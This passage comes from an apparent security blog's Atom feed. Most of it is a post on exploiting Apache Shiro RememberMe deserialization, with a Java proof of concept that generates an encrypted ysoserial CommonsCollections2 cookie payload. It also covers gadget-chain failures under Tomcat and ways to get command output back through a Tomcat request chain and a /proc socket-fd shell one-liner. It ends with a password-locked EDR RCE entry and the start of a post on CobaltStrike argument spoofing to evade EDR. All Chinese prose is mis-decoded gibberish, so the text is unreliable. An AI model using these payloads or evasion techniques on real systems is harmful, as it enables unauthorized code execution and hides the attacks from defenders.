src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978236110127.jpg" alt="-w601"></p><p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÂÖ∂‰ªñ gadget ÊâßË°åÊîªÂáªÔºå‰æãÂ¶Ç ysoserial Á≥ªÂàó</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>AesCipherService<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>DefaultSerializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ByteSource<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>CommonsCollections2<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Serializer<span class="token operator">&lt;</span>Object<span class="token operator">></span> serializer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSerializer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommonsCollections2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token string">"&lt;Exec Command>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">"&lt;INPUT KEY HERE>"</span><span class="token punctuation">,</span> serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">encrypt</span><span class="token punctuation">(</span>String key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objectBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyDecode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        AesCipherService cipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteSource byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>objectBytes<span class="token punctuation">,</span> keyDecode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="gadget-ÂºÇÂ∏∏"><a href="#gadget-ÂºÇÂ∏∏" class="headerlink" title="gadget ÂºÇÂ∏∏"></a>gadget ÂºÇÂ∏∏</h3><p>ËøôÈáåÂèØËÉΩ‰ºöÊúâ‰∫∫ÊèêÂà∞Ôºå‰∏∫‰ªÄ‰πàÂæàÂ§ö cc gadget Êó†Ê≥ï‰ΩøÁî®Âë¢ÔºüÁÆÄÂçïË∑ü‰∏Ä‰∏™ cc4Ôºå‰ºöÂèëÁé∞Êä•ÈîôÊèêÁ§∫Êâæ‰∏çÂà∞<code>org.apache.commons.collections4.Transformer</code>ÔºåËÄå shiro 1.2.4 ÈªòËÆ§‰ΩøÁî®ÁöÑ commons-collections4-4.0.jar ÁêÜËÆ∫‰∏äÊòØÂèØ‰ª•ÁöÑÂà©Áî®ÁöÑÔºåÊä•ÈîôÂéüÂõ†Âú®Âì™ÈáåÔºü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979087078911.jpg" alt="-w1501"></p><p>Êàë‰ª¨ÂõûÂà∞ÂèçÂ∫èÂàóÂåñÊúÄÂºÄÂßãÁöÑÂú∞Êñπorg.apache.shiro.io.DefaultSerializer#deserializeÔºåÊ≥®ÊÑèËøôÈáåË∞ÉÁî®ÁöÑÊòØClassResolvingObjectInputStream.readObject()</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979098205251.jpg" alt="-w699"></p><p>ClassResolvingObjectInputStreamÁªßÊâøËá™ObjectInputStream‰ΩÜÈáçÂÜô‰∫Ü resolveClassÔºåÊúÄÂ§ßÁöÑ‰∏çÂêåÂú®‰∫éÂä†ËΩΩÊñπÂºè</p><table><thead><tr><th>-</th><th align="center">ClassResolvingObjectInputStream</th><th align="center">ObjectInputStream</th></tr></thead><tbody><tr><td>‰ª£Á†Å</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979099399026.jpg" alt="-w724"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979099587009.jpg" alt="-w691"></td></tr><tr><td>Âä†ËΩΩ</td><td align="center">ClassUtils.forName<br>ÂÆûÈôÖ ClassLoader.loadClass</td><td align="center">Class.forName</td></tr><tr><td>‰ª£Á†Å</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979102998850.jpg" alt="-w918"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979106277660.jpg" alt="-w829"></td></tr></tbody></table><p>ÈÇ£‰πà‰∏§ÁßçÂä†ËΩΩÊñπÂºèÁöÑÂå∫Âà´ÊòØ‰ªÄ‰πàÔºüËøôÈáåÂèØÂÖàËØ¶ÁªÜÈòÖËØªËøôÁØáÊñáÁ´†Ôºö<a href="https://www.jianshu.com/p/83cbbd0b8b10" target="_blank" rel="noopener">ClassUtilsËØ¶Ëß£</a></p><table><thead><tr><th align="center">-</th><th align="center">ClassLoader.loadClass</th><th align="center">Class.forName</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">Ëé∑ÂèñÊåáÂÆöÁöÑ classLoader</td><td align="center">Ëá™Âä®Ëé∑Âèñ classLoader</td></tr><tr><td align="center">2</td><td align="center">Âè™ËÉΩÂ∞ÜÁ±ªÂä†ËΩΩÂà∞ JVM</td><td align="center">ÂèØÂä†ËΩΩÂà∞ JVM Âπ∂ÂàùÂßãÂåñ<br>(ObjectInputStream‰∏≠ËÆæÁΩÆ‰∏∫ false Êú™ÂàùÂßãÂåñ)</td></tr></tbody></table><p>ËøòÊòØÊ≤°ÊêûÊáÇÈóÆÈ¢òÂá∫Ëá™Âì™ÈáåÔºåÂè¶ÁΩë‰∏äÊúâÊèêÂèäÁöÑ‰∏ÄÂ§ÑÂå∫Âà´Ôºà<strong>Ê≥®ÊÑèÔºÅÊúâÈóÆÈ¢òÔºÅ</strong>Ôºâ</p><blockquote><p>ÊòØÂê¶‰ºöËß£ÊûêÊï∞ÁªÑÁ±ªÂûã<br>1ÔºâClass.forName‰ºöËß£ÊûêÊï∞ÁªÑÁ±ªÂûãÔºåÂ¶Ç[Ljava.lang.String;<br>2ÔºâClassLoader‰∏ç‰ºöËß£ÊûêÊï∞ÁªÑÁ±ªÂûãÔºåÂä†ËΩΩÊó∂‰ºöÊäõÂá∫ClassNotFoundException;</p></blockquote><p>‰ΩÜÊòØÁªèÊµãËØïWebAppClassLoaderÊòØÊúâËÉΩÂäõËß£ÊûêÊï∞ÁªÑÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979768116938.jpg" alt="-w631"></p><p>ÊúÄÂêéÂèëÁé∞ÂÖ≥ÈîÆÁÇπÂú®‰∫éorg.apache.catalina.loader.WebappClassLoaderBase#loadClass(java.lang.String, boolean)ÔºåÂú®Ë∞ÉÁî® Class.forName Êó∂<strong>ÊåáÂÆö‰ªéÁà∂Á±ªÂêë‰∏äÊêúÂØª</strong>ÔºåÂØºËá¥Êâæ‰∏çÂà∞<code>[Lorg.apache.commons.collections4.Transformer;</code>Á±ª</p><table><thead><tr><th align="center">ÂèÇÊï∞</th><th align="center">parent</th><th align="center">this</th></tr></thead><tbody><tr><td align="center">ClassLoader</td><td align="center">URLClassLoader</td><td align="center">WebappClassLoader</td></tr><tr><td align="center">ÊµãËØï</td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979885531644.jpg" alt="-w1260"></td><td align="center"><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979885797767.jpg" alt="-w1260"></td></tr></tbody></table><p>ÂÖ≥‰∫éWebappClassLoader‰∏éÂÖ∂‰ªñ ClassLoader ÂèØËØ¶ÁªÜÈòÖËØªÊ≠§ÁØáÊñáÁ´†Ôºö<a href="https://www.cnblogs.com/aspirant/p/8991830.html" target="_blank" rel="noopener">ÂõæËß£TomcatÁ±ªÂä†ËΩΩÊú∫Âà∂</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15979903825787.jpg" alt></p><blockquote><ol><li>WebappClassLoaderÔºöÂêÑ‰∏™WebappÁßÅÊúâÁöÑÁ±ªÂä†ËΩΩÂô®ÔºåÂä†ËΩΩË∑ØÂæÑ‰∏≠ÁöÑclassÂè™ÂØπÂΩìÂâçWebappÂèØËßÅ</li><li>tomcat ‰∏∫‰∫ÜÂÆûÁé∞ÈöîÁ¶ªÊÄßÔºåÊ≤°ÊúâÈÅµÂÆàÂèå‰∫≤ÂßîÊ¥æËøô‰∏™Á∫¶ÂÆöÔºåÊØè‰∏™webappClassLoaderÂä†ËΩΩËá™Â∑±ÁöÑÁõÆÂΩï‰∏ãÁöÑclassÊñá‰ª∂Ôºå‰∏ç‰ºö‰º†ÈÄíÁªôÁà∂Á±ªÂä†ËΩΩÂô®</li></ol></blockquote><p>ËÄå<code>commons-collections4-4.0.jar</code>‰Ωç‰∫é webapp ‰∏≠È°πÁõÆ /WEB-INF/lib ‰∏ãÔºåÂú®Ê≤°ÊúâÂÖ∂‰ªñÈ¢ùÂ§ñÈÖçÁΩÆ CLASSPATH ÁöÑÊÉÖÂÜµÊó∂ÔºåÈªòËÆ§Âè™Êúâ WebappClassLoader ÊâçËÉΩÂä†ËΩΩ</p><p><strong>ÊâÄ‰ª• Tomcat ‰∏∫‰ªÄ‰πàÊêúÁ¥¢ÊåáÂÆöÁà∂Á±ªÂºÄÂßãÔºüËøô‰∏™ËÆæËÆ°Â∞±ÂæàËø∑ü§îü§îü§î</strong></p><h2 id="V-ÂõûÊòæ"><a href="#V-ÂõûÊòæ" class="headerlink" title="V. ÂõûÊòæ"></a>V. ÂõûÊòæ</h2><p>Âú®ÈÅáÂà∞Âá†Ê¨°ÁõÆÊ†áÂêéÔºå‰ºöÂèëÁé∞ÊúâÁöÑËÆæÂ§áÊòØ‰∏çÂá∫ÁΩëÁöÑÔºåÂì™ÊÄïÁ¢∞ÊíûÂá∫‰∫Ü key ‰πü‰∏çÊ∏ÖÊ•öÊòØÂê¶Ê≠£Â∏∏ÊâßË°å‰∫ÜÂëΩ‰ª§ÔºåËøôÊó∂ÂÄôÂõûÊòæÁöÑËÉΩÂäõÂ∞±ÂæàÈáçË¶Å</p><p>Âõ†‰∏∫ÂØπÂõûÊòæÊ≤°ÊúâÁ†îÁ©∂ÔºåÁúã‰∫ÜÂÖ∂‰ªñÂ∏àÂÇÖÁöÑÊñáÁ´†ÔºåÊåâÁÖß<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">00thewayÂ∏àÂÇÖ</a>ËÆ≤ÁöÑÔºåÁõÆÂâçÂÖ¨ÂºÄÁöÑÂ§ßÊ¶ÇÊúâ‰ª•‰∏ãÂá†ÁßçÊñπÂºèËé∑ÂèñÁªìÊûúÔºö</p><ol><li>Êä•ÈîôÂõûÊòæ</li><li>web‰∏≠Ëé∑ÂèñÂΩìÂâç‰∏ä‰∏ãÊñáÂØπË±°Ôºàresponse„ÄÅcontext„ÄÅwriterÁ≠âÔºâ</li><li>ÂèØ‰ª•Âá∫ÁΩëÊÉÖÂÜµ‰∏ãOOB</li></ol><p>Âà©Áî®ÊïàÊûúÊØîËæÉÂ•ΩÁöÑÊúâ‰ª•‰∏ã‰∏§‰∏™ÔºåÂâçËÄÖÈÄÇÁî® Linux/Windows TomcatÔºåÂêéËÄÖÈÄÇÁî® Linux ÂêÑÁ±ªÂú∫ÊôØÔºåÂêÑÊúâ‰ºòÂäøÔºåÊåâÂú∫ÊôØÂà©Áî®</p><ol><li>Âü∫‰∫é Tomcat ResponseÔºö <a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">https://koalr.me/post/shiro-lou-dong-jian-ce/</a></li><li>Âü∫‰∫é Linux SocketÔºö <a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">https://www.00theway.org/2020/01/17/java-god-s-eye/</a></li></ol><h3 id="1-Tomcat-Gadget"><a href="#1-Tomcat-Gadget" class="headerlink" title="1. Tomcat Gadget"></a>1. Tomcat Gadget</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981176541010.jpg" alt="-w1100"></p><h4 id="ÂéüÁêÜ-2"><a href="#ÂéüÁêÜ-2" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>ÁºñËØë java-object-searcher ‰∏∫ jarÔºåÊñπ‰æøÂºïÁî®</p><pre class=" language-shell"><code class="language-shell">$> mvn clean package -Dmaven.test.skip=true</code></pre><p>ÊãâÂèñ Tomcat (ÈùûÊ∫êÁ†Å)ÔºåÂàõÂª∫‰∏Ä‰∏™ Tomcat È°πÁõÆÔºåÂπ∂Ëá™Ë°åÂàõÂª∫‰∏Ä‰∏™ Servlet Áî®‰∫éÊñ≠ÁÇπË∞ÉËØï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981590274384.jpg" alt="-w1443"></p><p>ÊµãËØï Tomcat 8.0.39 ÁéØÂ¢É‰∏ãÂÆûÈôÖÂè™Êúâ‰∏ÄÊù° gadget</p><pre class=" language-plain"><code class="language-plain">TargetObject = {org.apache.tomcat.util.threads.TaskThread}   ---> group = {java.lang.ThreadGroup}    ---> threads = {class [Ljava.lang.Thread;}     ---> [5] = {java.lang.Thread}      ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}       ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}         ---> handler = {org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler}          ---> global = {org.apache.coyote.RequestGroupInfo}           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>}            ---> [0] = {org.apache.coyote.RequestInfo}             ---> req = {org.apache.coyote.Request}</code></pre><p>Âú®ËøôÈáåÂèàÈÅáÂà∞‰∫Ü cookie ËøáÂ§ßÁöÑÊÉÖÂÜµÔºåËß£ÂÜ≥ÊñπÊ≥ïËØ∑ÁúãËøôÁØá<a href="https://xz.aliyun.com/t/6227" target="_blank" rel="noopener">Áº©Â∞èysoserial payload‰ΩìÁßØÁöÑÂá†‰∏™ÊñπÊ≥ï</a></p><p>‰ΩøÁî® javassist Âä†ËΩΩÁõÆÊ†áÁ±ªÔºåÂØºËá¥‰ΩìÁßØËøáÂ§ß</p><pre class=" language-java"><code class="language-java">pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CtClass clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>TomcatEcho<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981183428132.jpg" alt="-w676"></p><p>ËΩ¨Âèò‰∏∫‰ΩøÁî® javassist Áõ¥Êé•ÂàõÂª∫Á±ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15981184068390.jpg" alt="-w656"></p><p>ÊàëËøôÈáåÂè™ÊòØÂÆûÁé∞ DemoÔºåÊ≤°ÊúâÂØπÂêÑ‰∏™ Tomcat ÁâàÊú¨‰ª•Âèä CC gadget ÂÅöÂÖºÂÆπÔºåËøô‰ΩçÂ∏àÂÇÖÂÆûÁé∞ÂØπÂà©Áî®ÈìæÊõ¥ÂπøÊ≥õÁöÑÂÖºÂÆπÔºö<a href="https://koalr.me/post/shiro-lou-dong-jian-ce/" target="_blank" rel="noopener">Shiro RememberMe ÊºèÊ¥ûÊ£ÄÊµãÁöÑÊé¢Á¥¢‰πãË∑Ø</a></p><h3 id="2-Linux-Socket"><a href="#2-Linux-Socket" class="headerlink" title="2. Linux Socket"></a>2. Linux Socket</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15980718016937.jpg" alt="-w1145"></p><h4 id="ÂéüÁêÜ-3"><a href="#ÂéüÁêÜ-3" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h4><p>Âü∫‰∫é Linux ‰∏áÁâ©ÁöÜÊñá‰ª∂ÁöÑÊÄßË¥®ÔºåÂØπ‰∫éÊØè‰∏Ä‰∏™ÈìæÊé• socket ÈÉΩÊúâÂÖ∂ÂØπÂ∫îÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶ÔºåÈÄöËøáÁõ¥Êé•ÂêëÊñá‰ª∂ÊèèËø∞Á¨¶ÂÜôÂÖ•ÂÜÖÂÆπÂÆûÁé∞ÂõûÊòæ</p><p>ÊúâÈÉ®ÂàÜÊñáÁ´†‰ΩøÁî®ÊòØ<strong>Â∞ùËØïÈÄöËøá IP„ÄÅPORT ËøõË°åËøáÊª§Ëé∑Âèñ inode ÂÄºÂêéÔºåÂÜçËé∑Âèñ fd ÂÜôÂÖ•</strong>ÔºåËøô‰∏™ÊñπÊ≥ïÊúâ‰∏Ä‰∏™ÂæàÂ§ßÁöÑÈóÆÈ¢òÂú®‰∫éÂ¶ÇÊûúÁõÆÊ†á‰Ωç‰∫éË¥üËΩΩ„ÄÅ‰ª£ÁêÜ‰πãÂêéÁöÑÂ§çÊùÇÁΩëÁªúÔºåÊòØÊ≤°ÊúâÂäûÊ≥ïÁ≠õÈÄâÂá∫ÊúâÊïàÁöÑËØ∑Ê±ÇÊ∫êÔºåÂØºËá¥ÊñπÊ≥ïÂ§±Ë¥•</p><p><strong>ÊâÄ‰ª•ÊàëÈááÁî®ÈÄöËøáËé∑ÂèñÊâÄÊúâÊúâÊïà inode ÂÄºÔºåÂÜçËé∑Âèñ fd ÁªÑÔºåÁªü‰∏ÄÂ∞ùËØïÂÜôÂÖ•ÔºåÁ™ÅÁ†¥Â§çÊùÇÁΩëÁªúÔºåÂÆûÁé∞ÂõûÊòæ</strong>üòà</p><p>È¶ñÂÖà‰∫ÜËß£‰∏ã /proc/self/net/tcp</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15980738788715.jpg" alt="-w722"></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/net/tcp_states.h</span><span class="token keyword">enum</span> <span class="token punctuation">{</span>    TCP_ESTABLISHED <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>    TCP_SYN_SENT<span class="token punctuation">,</span>    TCP_SYN_RECV<span class="token punctuation">,</span>    TCP_FIN_WAIT1<span class="token punctuation">,</span>    TCP_FIN_WAIT2<span class="token punctuation">,</span>    TCP_TIME_WAIT<span class="token punctuation">,</span>    TCP_CLOSE<span class="token punctuation">,</span>    TCP_CLOSE_WAIT<span class="token punctuation">,</span>    TCP_LAST_ACK<span class="token punctuation">,</span>    TCP_LISTEN<span class="token punctuation">,</span>    TCP_CLOSING<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">/* Now a valid state */</span>    TCP_NEW_SYN_RECV<span class="token punctuation">,</span>    TCP_MAX_STATES    <span class="token comment" spellcheck="true">/* Leave at the end! */</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>ÂÖ≥Ê≥®Âà∞ connection state Ê†áÂøóÔºåÈÄöËøáÂà§Êñ≠ÊòØÂê¶‰∏∫1Â∞±ÂèØ‰ª•Á≠õÈÄâÊ≠£Âú®‰º†ËæìÁöÑ socket ÁöÑ inode ÂÄº</p><p>‰πãÂêéÈÄöËøáÁ≠õÈÄâ /proc/self/fd ‰∏≠ socket[<inode>] ÂØπÂ∫îÊñá‰ª∂ÊèèËø∞Á¨¶ÂÄºÔºåÈÅçÂéÜÂ∞ùËØïÂÜôÂÖ•Âç≥ÂèØ</inode></p><p>‰∏ãÈù¢ÊòØÊàëÁî®Êù•Á≠õÈÄâÁöÑËØ≠Âè• Orz</p><pre class=" language-shell"><code class="language-shell">$ > inode=`cat /proc/net/tcp|tail -n +2|awk '{if($4=="01")print}'|awk '{print $10}'`;for i in $inode; do fd=`ls -l /proc/$PPID/fd|grep socket|grep $i|awk '{print $9}'`; if [ ${#fd} -gt 0 ]; then echo -n $fd-;fi;done;$ > 97-57-</code></pre><p>ÂéüÊú¨ÊòØÊÉ≥ÈÄöËøáÂÖ®ÈÉ®Áî± JAVA ÂéüÁîü‰ª£Á†ÅÂÆûÁé∞ÔºåÁªìÊûúÂèëÁé∞ÁîüÊàêÁöÑ Payload ÈïøÂ∫¶Ë∂ÖÂá∫‰∫Ü Cookie or Header Length ÈôêÂà∂ÔºåÈô§ÈùûÂè¶Âà©Áî® gadget Âéª‰øÆÊîπÔºåÂê¶Âàô‰ºöËß¶Âèë ERROR 400ÔºåÂêéÈù¢ÂèëÁé∞Áî® shell Áõ¥Êé•ËøáÊª§ fd  Êõ¥Êñπ‰æøÂø´Êç∑</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://xz.aliyun.com/t/6227#toc-4" target="_blank" rel="noopener">Áº©Â∞èysoserial payload‰ΩìÁßØÁöÑÂá†‰∏™ÊñπÊ≥ï</a></li><li><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/" target="_blank" rel="noopener">ÈÄöÊùÄÊºèÊ¥ûÂà©Áî®ÂõûÊòæÊñπÊ≥ï-linuxÂπ≥Âè∞</a></li><li><a href="http://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo" target="_blank" rel="noopener">ÂçäËá™Âä®ÂåñÊåñÊéòrequestÂÆûÁé∞Â§öÁßç‰∏≠Èó¥‰ª∂ÂõûÊòæ</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‰∏ÄÊ¨°ÈÅáÂà∞Ê°à‰æãÔºåÂà©Áî®ÈÉ®ÂàÜÂ∑•ÂÖ∑Êó†Ê≥ïÊúâÊïàÂÆûÁé∞ÊâßË°å„ÄÅÂõûÊòæÔºå‰∫éÊòØÊúâ‰∫ÜÊ≠§ÁØá&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Ê∑±‰ø°Êúç EDR RCE ÁÆÄÊûê</title>
    <link href="https://blog.sari3l.com/posts/6712089c/"/>
    <id>https://blog.sari3l.com/posts/6712089c/</id>
    <published>2020-08-18T03:23:31.000Z</published>
    <updated>2020-08-26T06:40:20.190Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e6b3455a09d258c5b541c30a30c1ab04f6b7aa4f35923d5f7b4015e7361a84b2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
      <category term="Ê∑±‰ø°Êúç" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike Argue ÂéüÁêÜ - ÁøªËØëÊñá</title>
    <link href="https://blog.sari3l.com/posts/c5e878c3/"/>
    <id>https://blog.sari3l.com/posts/c5e878c3/</id>
    <published>2020-08-04T09:26:01.000Z</published>
    <updated>2020-08-04T09:46:29.621Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/c5e878c3/15965212817543.jpg" alt></p><p>Áúã youtube ËßÜÈ¢ë‰ªãÁªçÔºåÊ≠§ÊîªÂáªÂéüÊú¨ÊòØ‰∏∫‰∫ÜÂØπÊäó EDR Ê£ÄÊµãÊàñÂª∂Ëøü AV Êü•ÊùÄÁöÑÊâãÊÆµ</p><p>ÂéüÁêÜÂæàÁÆÄÂçïÔºåÈÄöËøáËÆæÁΩÆCREATE_SUSPENDEDÊåÇËµ∑ËøõÁ®ãÂêØÂä®ÔºåÂÜçÈÄöËøáPEB‰øÆÊîπProcessParameters‰∏≠ÂÆûÈôÖÂ∞ÜË¶ÅÊâßË°åÁöÑÂëΩ‰ª§Â≠óÁ¨¶‰∏≤ÔºåÊúÄÂêéResumeThreadÊÅ¢Â§çËøõÁ®ã ‚Üí ÊöóÂ∫¶Èôà‰ªì</p><p>Âú®ÂÆûÁé∞Êó∂ÔºåÂª∂‰º∏Âá∫Êù•‰∏§‰∏™Â∞èÈóÆÈ¢ò(ÊäÄÂ∑ß)</p><ol><li>Â¶Ç‰ΩïËé∑Âèñ PEB Âπ∂Êõ¥Êñ∞</li><li>ÁªïËøá PEB ÂâØÊú¨Ê£ÄÊµã</li></ol><h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h2><pre class=" language-cpp"><code class="language-cpp">BOOL <span class="token function">CreateProcessA</span><span class="token punctuation">(</span>  LPCSTR                lpApplicationName<span class="token punctuation">,</span>  LPSTR                 lpCommandLine<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpProcessAttributes<span class="token punctuation">,</span>  LPSECURITY_ATTRIBUTES lpThreadAttributes<span class="token punctuation">,</span>  BOOL                  bInheritHandles<span class="token punctuation">,</span>  DWORD                 dwCreationFlags<span class="token punctuation">,</span>  LPVOID                lpEnvironment<span class="token punctuation">,</span>  LPCSTR                lpCurrentDirectory<span class="token punctuation">,</span>  LPSTARTUPINFOA        lpStartupInfo<span class="token punctuation">,</span>  LPPROCESS_INFORMATION lpProcessInformation<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Âú®<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" 